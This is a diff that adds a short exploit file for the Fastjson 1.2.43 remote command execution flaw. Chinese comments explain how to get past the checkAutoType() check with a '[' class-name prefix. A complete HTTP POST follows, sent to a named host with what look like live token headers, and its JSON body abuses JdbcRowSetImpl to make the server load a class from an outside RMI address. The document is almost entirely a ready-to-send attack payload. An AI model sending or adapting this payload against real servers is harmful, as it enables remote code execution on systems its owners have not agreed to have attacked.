@@ -1,0 +1,17 @@
+# 利用【Fastjson_1.2.43远程命令执行漏洞执行命令】
+# fastjson在1.2.43中checkAutoType()函数增加判断开头为LL直接报错。 绕过方法: 根据fastjson判断函数，[开头则提取类名，且后面字符字符为”[“、”{“等，即可正常调用。autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）
+POST /?acid=80000829&bid=hd_tag_m8mv242w HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv242w
+RM-PRO-Token: 541f5c010925e4356e30b14536e1246e
+RM-PRO-Time: 1742808360750
+User-Agent: curl/7.83.1
+Content-Type: application/json
+
+{
+    "b":{
+        "@type":"[com.sun.rowset.JdbcRowSetImpl"[{,
+        "dataSourceName":"rmi://test.com:9999/TouchFile",
+        "autoCommit":true
+    }
+}
